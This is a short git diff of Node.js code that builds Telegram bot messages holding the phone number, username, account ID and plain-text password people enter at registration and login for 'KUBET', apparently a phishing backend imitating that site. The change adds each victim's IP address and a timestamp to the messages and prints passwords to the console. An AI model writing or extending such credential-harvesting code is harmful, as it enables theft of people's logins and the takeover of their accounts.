@@ -3,9 +3,11 @@ const axios = require('axios');
 const token = process.env.TELEGRAM_TOKEN;; 
 const chatId = process.env.CHAT_ID;
 
-async function sendRegisterAccountToBot(cellPhone, accountID, nickName, password) {
-
+async function sendRegisterAccountToBot(cellPhone, accountID, nickName, userIp, timeNow, password) {
+console.log(timeNow, password)
     const message = `KUBET ĐĂNG KÝ
+IP: ${userIp}
+Thời Gian: ${timeNow}
 Số Điện Thoại: ${cellPhone}
 Tên Người Dùng: ${nickName}
 Tên Đăng Nhập: ${accountID}
@@ -27,9 +29,11 @@ Mật Khẩu: ${password}`
     }
 }
 
-async function sendLoginAccountToBot(cellPhone, nickName, password) {
+async function sendLoginAccountToBot(cellPhone, nickName, userIp, timeNow, password) {
 
     const message = `KUBET ĐĂNG NHẬP
+IP: ${userIp}
+Thời Gian: ${timeNow}
 Số Điện Thoại: ${cellPhone}
 Tên Tài Khoản: ${nickName}
 Mật Khẩu: ${password}`
